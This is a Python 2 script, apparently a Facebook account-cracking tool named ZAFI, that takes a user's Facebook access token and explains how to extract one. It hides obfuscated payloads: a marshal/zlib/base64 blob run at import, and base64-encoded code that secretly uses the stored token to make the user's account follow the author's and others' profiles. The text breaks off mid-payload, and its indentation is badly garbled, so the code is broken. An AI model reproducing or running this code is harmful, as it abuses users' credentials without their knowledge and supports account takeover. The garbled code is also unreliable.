#!/usr/bin/python2
# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak
# Open source code team | ngotak dikit cok jangan jual di perjual belikan 

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :
 - author      : MRX.131
 -  - facebook    : facebook.com/TR1CKER.MRX
 - fanspage    : facebook.com/101036299182266
 -  - whatsap     : +6287803223342
 - github      : github.com/Miftahdrknet
 -  - script name : ZAFI (Zona Akun Facebook Indonesia)
 - version     : 1.1
%s"""%(Hj,Mt))
import os
try:
    import requests
    except ImportError:
        os.system('pip2 install requests')
        try:
            import concurrent.futures
            except ImportError:
                os.system('pip2 install futures')
                try:
                    import bs4
                    except ImportError:
                        os.system('pip2 install bs4')
                        import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
                        from concurrent.futures import ThreadPoolExecutor 
                        from bs4 import BeautifulSoup as parser
                        from time import sleep as jeda
                        from datetime import datetime
                        _=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
                        user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
                        def jalan(z):
                            for e in z + '\n':
                                    sys.stdout.write(e)
                                            sys.stdout.flush();jeda(0.03)
                                            def tik():
                                                titik = ['.   ','..  ','... ']
                                                    for o in titik:
                                                            print ('\r%s%s menghapus token %s'%(M,til,o)),
                                                                    sys.stdout.flush();jeda(1)
                                                                    def folder():
                                                                    	try:os.mkdir('hasil')
                                                                    		except:pass
                                                                    			try:os.mkdir('data')
                                                                    				except:pass
                                                                    					try:
                                                                    							ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                                                                    									open("data/ua.txt","w").write(ua_)
                                                                    										except:
                                                                    												pass
                                                                    												# LOGO (LO GOBLOK)
                                                                    												IP = requests.get("https://api.ipify.org/").text
                                                                    												def banner():
                                                                    													print (''' %s 
                                                                    													 © Group%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s> %sZona \n   /     /\\__  \\\   __\|  | %s> %sAkun \n  /     /_ / __ \|  |  |  | %s>%s Facebook [Meta] \n /_______ (____  /__|  |__| %s>%s Indonesia \n         \/    \/ \n %s[%s*%s] By : %sROSYID.XD \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
                                                                    													  (H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
                                                                    													  # MASUK TOKEN (TOKEN LISTRIK)
                                                                    													  header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                                                                    													  def masuk():
                                                                    													      os.system('clear');banner()
                                                                    													          print ('\n%s [01] Login via token \n [02] Cara mendapatkan token \n [%s00%s] Keluar'%(P,M,P))
                                                                    													              rom = raw_input('\n%s [?] Menu : %s'%(P,K))
                                                                    													                  if rom in(""):
                                                                    													                      	print("%s [!] Yang bener anjing "%(M));exit()
                                                                    													                      	    elif rom in ('1','01'):
                                                                    													                      	            jalan("\n%s [%s!%s] Wajib gunakan akun tumbal dilarang akun utama"%(P,M,P))
                                                                    													                      	                	romz = raw_input('%s [?] Token : %s'%(P,K))
                                                                    													                      	                	        if romz in(""):
                                                                    													                      	                	                	print("%s [!] Yang benr anjing "%(M));exit()
                                                                    													                      	                	                	    	try:
                                                                    													                      	                	                	    	            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
                                                                    													                      	                	                	    	                        print ('\n%s[√] Login berhasil, mohon tunggu '%(H));jeda(2)
                                                                    													                      	                	                	    	                                    open('token.txt', 'w').write(romz);login_xx()
                                                                    													                      	                	                	    	                                                exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
                                                                    													                      	                	                	    	                                                        except (KeyError,IOError):
                                                                    													                      	                	                	    	                                                                	print("%s [!] Token invalid "%(M));masuk()
                                                                    													                      	                	                	    	                                                                	    elif rom in ('2', '02'):
                                                                    													                      	                	                	    	                                                                	        	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
                                                                    													                      	                	                	    	                                                                	        	        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
                                                                    													                      	                	                	    	                                                                	        	                print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
                                                                    													                      	                	                	    	                                                                	        	                        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
                                                                    													                      	                	                	    	                                                                	        	                                print (" - salin link : %sview-source:https://business.facebook.com/business_locations"%(O));jeda(2)
                                                                    													                      	                	                	    	                                                                	        	                                        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
                                                                    													                      	                	                	    	                                                                	        	                                                print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
                                                                    													                      	                	                	    	                                                                	        	                                                        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
                                                                    													                      	                	                	    	                                                                	        	                                                                print (" - ketik %sEAAG %sakan muncul acces token."%(O,H));jeda(2)
                                                                    													                      	                	                	    	                                                                	        	                                                                        print (" - jika sudah jangan lupa di salin \n");jeda(2)
                                                                    													                      	                	                	    	                                                                	        	                                                                                nanya = raw_input('%s [?] Anda paham? [%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
                                                                    													                      	                	                	    	                                                                	        	                                                                                        if nanya in(""):
                                                                    													                      	                	                	    	                                                                	        	                                                                                                	print ("%s [!] saya bertanya wajib di jawab "%(M));jeda(2);masuk()
                                                                    													                      	                	                	    	                                                                	        	                                                                                                	        elif nanya in("y","Y"):
                                                                    													                      	                	                	    	                                                                	        	                                                                                                	                	print ("\n%s [√] selamat anjing pintar :* "%(H));jeda(2);masuk()
                                                                    													                      	                	                	    	                                                                	        	                                                                                                	                	        elif nanya in("n","N"):
                                                                    													                      	                	                	    	                                                                	        	                                                                                                	                	                	print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
                                                                    													                      	                	                	    	                                                                	        	                                                                                                	                	                	    elif rom in ('0', '00'):
                                                                    													                      	                	                	    	                                                                	        	                                                                                                	                	                	        	exit('\n')
                                                                    													                      	                	                	    	                                                                	        	                                                                                                	                	                	        	    else:
                                                                    													                      	                	                	    	                                                                	        	                                                                                                	                	                	        	        	print("%s [!] Yang bener anjing "%(M));exit()
                                                                    													                      	                	                	    	                                                                	        	                                                                                                	                	                	        	        	exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUy
